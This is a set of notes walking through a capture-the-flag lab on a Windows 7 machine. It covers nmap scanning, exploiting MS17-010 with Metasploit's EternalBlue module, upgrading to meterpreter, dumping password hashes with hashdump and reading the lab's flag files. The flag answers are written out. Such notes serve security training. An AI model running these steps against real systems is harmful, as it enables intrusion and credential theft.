	1. How many ports are open with a port number under 1000? ( active enumeration )

		>> nmap -Pn -A -sV 10.10.165.189
		>>PORT      STATE SERVICE      VERSION
		
		135/tcp   open  msrpc        Microsoft Windows RPC 
		139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
		445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)

		49158/tcp open  msrpc        Microsoft Windows RPC
		49160/tcp open  msrpc        Microsoft Windows RPC
		
		there are 3 services running ( msrpc, netbios-ssn, microsoft-ds )	
		
		>>therefore answer is 3

	2. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

		>> ms17-010

	2. Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
	
		>> exploit/windows/smb/ms17_010_eternalblue 
		
	3. Show options and set the one required value. What is the name of this value? (All caps for submission)

		>> RHOSTS
		
>> Escalate:
	
	1. If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
		
		>> background
		
		>> search shell_to  >> post/multi/manage/shell_to_meterpreter ( use upgrade to the meterpreter shell )
		
	2. Select this (use MODULE_PATH). Show options, what option are we required to change?
		
		>> use post/multi/manage/shell_to_meterpreter
		
		>> show options 
		
		>> see the required option >> i.e. "SESSION"
		
	3. Set the required option, you may need to list all of the sessions to find your target here. 
	
		>> set SESSION 1
		
		>> exploit 
		
		>> shell
		
		>> whoami
		
	4. Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.

		>> ps

		>> shell 
		
>> Cracking
	
	1. Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
		
		>> ctrl + z
		 
		>> hashdump
		
		>> " Jon "
	
	2. Copy this password hash to a file and research how to crack it. What is the cracked password?

>> Find flags!

	1. Flag1? This flag can be found at the system root. 
		
		>> shell
		
		>> cd C://
		
		>> dir 
		
		>> type flag1.txt { type is like echo in the windows }
		
		>> " flag{access_the_machine} "
		
	2. flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
	
		>> cd Users/Jon/Documents 
		
		>> type flag3.txt
		
		>> " flag{admin_documents_can_be_valuable} "
		
	3. Flag2? This flag can be found at the location where passwords are stored within Windows.
	
		>> from the flag3 we get to know that flag2 is in the system32
		
		>> cd C:\Windows\System32\config
		
		>> dir
		
		>> type flag2.txt
